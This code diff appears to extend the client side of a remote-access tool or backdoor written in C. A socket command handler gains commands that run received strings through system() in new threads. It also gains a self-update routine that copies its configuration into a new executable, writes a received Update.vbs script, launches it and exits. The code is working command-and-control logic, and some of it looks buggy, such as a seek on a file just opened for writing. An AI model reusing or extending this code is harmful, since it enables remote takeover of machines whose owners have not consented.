@@ -1,4 +1,12 @@
 #include "PublicHead.h"
+void* NewProcess(void * p){
+    char *Process=(char *)p;
+    //printf("p:%d\n",p);
+    printf("Process:%s\n",Process);
+    system(Process);
+    return 0;
+}
+
 void CMDProc(char * Order,int Datalen, SOCKET TCPSocket){
     //for(int i=0;i<Datalen;i++){printf("%02x,",Order[i]);}printf("\n");
 
@@ -23,10 +31,19 @@ void CMDProc(char * Order,int Datalen, SOCKET TCPSocket){
                     //printf("revData:%s\n",revData+2);
                     system(Order+2);
                     break;
-                case 0x07://执行连续命令,先打开cmd，但无返回值
+                case 0x07://执行cmd有返回值
+                    break;
+                case 0x08://打开一个新进程执行CMD
+                    //printf("OrderAddr:%d\n",Order);
+                    //printf("Order+2:%s\n",Order+2);
+                    pthread_create(NULL, NULL, NewProcess, Order+2);
+                    Sleep(100);//此处睡眠为了内存不那么快被回收
+                    break;
+                case 0x09://执行连续命令,先打开cmd，但无返回值
                     break;
 
             }
+            break;
         case 0x01://文件操作类
             switch(Order[1]){
                 case 0x00://上传文件到客户机
@@ -92,10 +109,41 @@ void CMDProc(char * Order,int Datalen, SOCKET TCPSocket){
                     //printf("Datalen:%d",Datalen);
                     send(TCPSocket, Order, Datalen, 0);
                     Order += 8;
+                    break;
 
 
             }
+            break;
+        case 0x02://自我操作类
+            switch(Order[1]){
+                case 0x00: //停止服务
+                    exit(0);
+                case 0x01: //自我更新
+                    printf("OK0");
+                    //将自己的配置信息复制给新的可执行文件
+                    fp = fopen(Order+2,"r+b");
+                    fseek(fp, -32, SEEK_END);
+                    fwrite(Configs,1,32,fp);
+                    fclose(fp);
+                    printf("OK1");
+                    //执行更新脚本
+                    //printf("Scrpt:%s\n",);
+                    //Buffer = (char *)malloc(12);
+                    fp = fopen("Update.vbs","w");
+                    fseek(fp, -32, SEEK_END);
+                    fwrite(Order + strlen(Order+2) + 3,1,strlen(Order + strlen(Order+2) + 3),fp);
+                    fclose(fp);
+                    printf("OK2");
+                    pthread_create(NULL, NULL, NewProcess, (char *)"start Update.vbs");
+                    Sleep(100);
+                    printf("OK3");
+                    exit(0);
+                    break;
+            }
+            break;
     }
-    //printf("free");
+
+    printf("free\n");
     free(Order-8);
+    printf("freeOK\n");
 }
